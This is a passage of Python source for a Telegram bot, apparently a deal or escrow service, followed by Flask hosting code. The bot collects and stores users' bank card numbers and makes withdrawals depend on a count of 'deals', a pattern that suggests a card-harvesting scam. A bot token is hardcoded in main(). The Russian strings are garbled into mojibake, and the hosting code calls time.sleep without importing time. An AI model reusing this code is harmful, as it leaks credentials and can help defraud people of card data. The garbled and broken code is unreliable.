            card_number = text.strip()
            if len(card_number) < 16 or not card_number.isdigit():
                await update.message.reply_text(
                    get_text(user_id, 'invalid_card', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return
            user_cards[user_id] = card_number
            context.user_data['waiting_for_card'] = False
            deals = user_deals_count.get(user_id, 0)
            await update.message.reply_text(
                get_text(user_id, 'card_saved', context,
                         card=card_number,
                         min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                         fee=SYSTEM_FEE_PERCENT,
                         deals=deals),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )

        else:
            await send_main_menu_with_photo(update.message.chat_id, context)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ handle_message: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")


# ------------------ –û–ë–†–ê–ë–û–¢–ß–ò–ö –ù–ï–ò–ó–í–ï–°–¢–ù–´–• –ö–û–ú–ê–ù–î ------------------
async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message:
        await send_main_menu_with_photo(update.message.chat_id, context)


# ------------------ –û–ë–†–ê–ë–û–¢–ß–ò–ö –û–®–ò–ë–û–ö ------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è {update}: {context.error}")


# ------------------ –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø ------------------
def main():
    try:
        print("üîÑ –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
        print("‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –¥–≤—É—Ö —è–∑—ã–∫–æ–≤ (—Ä—É—Å—Å–∫–∏–π/–∞–Ω–≥–ª–∏–π—Å–∫–∏–π) —Å –≤—ã–±–æ—Ä–æ–º –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ")
        print(f"üìä –î–ª—è –≤—ã–≤–æ–¥–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ {MIN_DEALS_FOR_WITHDRAWAL} —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ (–∫—Ä–æ–º–µ –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)")
        application = Application.builder().token("8434337177:AAF78qGuyJ_F8O2hVNCnJ-p3S63U3rVgWMU").build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("buy", buy_command))
        application.add_handler(CommandHandler("set_my_deals", set_my_deals_command))
        application.add_handler(CommandHandler("my_stats", my_stats_command))
        application.add_handler(CommandHandler("language", language_command))

        application.add_handler(CommandHandler("add_user", add_user_command))
        application.add_handler(CommandHandler("remove_user", remove_user_command))
        application.add_handler(CommandHandler("list_users", list_users_command))
        application.add_handler(CommandHandler("admin_balance", admin_balance_command))

        application.add_handler(MessageHandler(filters.COMMAND, unknown_command))
        application.add_handler(CallbackQueryHandler(handle_callback_query))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        application.add_error_handler(error_handler)

        print("‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω —É—Å–ø–µ—à–Ω–æ!")
        application.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

    except Conflict as e:
        print("‚ùå –û–®–ò–ë–ö–ê: –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –±–æ—Ç–æ–≤! –ó–∞–≤–µ—Ä—à–∏—Ç–µ –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã Python.")
        input("–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞...")
    except Exception as e:
        logger.error(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞: {e}")
        print(f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
        input("–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞...")


if __name__ == "__main__":
    main()
# ===== –ö–û–î –î–õ–Ø –•–û–°–¢–ê =====
from flask import Flask
import threading
import os
import sys
import traceback

app = Flask(__name__)

@app.route('/')
@app.route('/health')
def health():
    return "Bot is running", 200

def run_flask():
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port)

def run_bot():
    try:
        main()  # –∑–∞–ø—É—Å–∫ –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
    except Exception as e:
        # –ü–µ—á–∞—Ç–∞–µ–º –æ—à–∏–±–∫—É –≤ stderr, —á—Ç–æ–±—ã –æ–Ω–∞ –ø–æ–ø–∞–ª–∞ –≤ –ª–æ–≥–∏ Render
        print("‚ùå –û—à–∏–±–∫–∞ –≤ –±–æ—Ç–µ:", file=sys.stderr)
        traceback.print_exc(file=sys.stderr)
        # –ù–µ –∑–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å, —á—Ç–æ–±—ã Render –Ω–µ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–ª –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ
        while True:
            time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    run_bot()